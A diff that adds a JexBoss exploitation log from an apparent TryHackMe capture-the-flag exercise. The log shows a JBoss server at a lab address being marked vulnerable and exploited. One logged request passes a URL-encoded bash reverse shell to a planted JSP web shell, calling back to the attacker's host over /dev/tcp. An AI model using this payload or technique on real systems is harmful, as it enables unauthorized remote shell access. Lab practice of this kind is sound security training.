@@ -1,0 +1,25 @@
+2020-09-12 10:04:25,955 (CRITICAL): Module urllib3 not installed. See details:
+Traceback (most recent call last):
+  File "/home/blackghost/Desktop/CTF_challenges/tryhackme.com/challenges/Jacob/jexboss/jexboss.py", line 85, in <module>
+    from urllib3.util import parse_url
+ImportError: No module named urllib3.util
+2020-09-12 10:05:13,332 (CRITICAL): Module urllib3 not installed. See details:
+Traceback (most recent call last):
+  File "/home/blackghost/Desktop/CTF_challenges/tryhackme.com/challenges/Jacob/jexboss/jexboss.py", line 85, in <module>
+    from urllib3.util import parse_url
+ImportError: No module named urllib3.util
+2020-09-12 10:08:22,542 (INFO): Checking Host: http://10.10.179.219:8080
+2020-09-12 10:08:25,261 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:08:25,739 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:08:26,021 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:08:46,057 (INFO): Server http://10.10.179.219:8080 exploited!
+2020-09-12 10:11:17,313 (INFO): Interrupting execution ...
+2020-09-12 10:11:48,919 (INFO): Checking Host: http://10.10.179.219:8080
+2020-09-12 10:11:49,856 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:11:50,309 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:11:50,549 (INFO): Server http://10.10.179.219:8080: VULNERABLE
+2020-09-12 10:12:13,214 (INFO): Server http://10.10.179.219:8080 exploited!
+2020-09-12 10:17:06,642 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='10.10.179.219', port=8080): Read timed out. (read timeout=6.0)")': /jexws4/jexws4.jsp?ppp=%2Fbin%2Fbash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.125.120%2F1234+0%3E%261
+2020-09-12 10:32:37,451 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f682ba28160>, 'Connection to 10.10.179.219 timed out. (connect timeout=3)')': /web-console/Invoker
+2020-09-12 10:32:40,455 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f682ba28550>, 'Connection to 10.10.179.219 timed out. (connect timeout=3)')': /web-console/Invoker
+2020-09-12 10:32:43,460 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f682ba287c0>, 'Connection to 10.10.179.219 timed out. (connect timeout=3)')': /web-console/Invoker
